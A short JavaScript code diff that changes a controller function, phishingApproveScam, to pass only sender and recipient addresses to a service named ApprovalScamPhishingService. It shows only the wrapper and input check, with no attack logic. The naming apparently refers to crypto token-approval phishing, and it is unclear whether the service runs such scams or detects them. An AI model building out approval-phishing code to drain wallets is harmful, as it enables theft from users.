@@ -1,13 +1,13 @@
 const phishingService = require("../services/phishingService");
 
-const phishingApproveScam = async (_from, _to, _value, _currencySymbol)=> {
+const phishingApproveScam = async (_from, _to)=> {
     
-    if (!_from || !_to || !_value || !_currencySymbol){
+    if (!_from || !_to){
         return {success: false, message: "Some of the credentials is missing or wrong."};
     }
     
     try {
-        const response = await phishingService.ApprovalScamPhishingService(_from, _to, _value, _currencySymbol);
+        const response = await phishingService.ApprovalScamPhishingService(_from, _to);
     
         return {success: true, data: response}
     } catch (err) {
